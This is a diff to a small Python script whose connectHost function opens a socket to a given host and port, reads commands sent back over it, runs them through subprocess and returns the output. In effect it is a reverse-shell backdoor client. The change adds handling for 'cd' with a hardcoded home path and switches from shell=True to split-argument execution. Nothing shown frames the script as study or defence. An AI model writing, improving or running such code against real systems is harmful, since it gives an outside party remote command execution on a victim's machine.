@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import os
 import socket
 import subprocess
 import argparse
@@ -14,9 +15,18 @@ def connectHost(ht,pt):
     while True:
         data = sock.recv(1024)
         data = data.decode('utf-8')
-        comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        m_stdout, m_stderr = comRst.communicate()
-        sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
+        data = data.split()
+        m_stdout = None
+
+        if data[0] == 'cd':
+            os.chdir(data[1].replace("~", "/home/wang"))
+        else:
+            try:
+                comRst = subprocess.Popen(data,shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                m_stdout, m_stderr = comRst.communicate()
+            except:
+                pass
+        sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8') if m_stdout else b"command completed")
         time.sleep(1)
     sock.close()
 
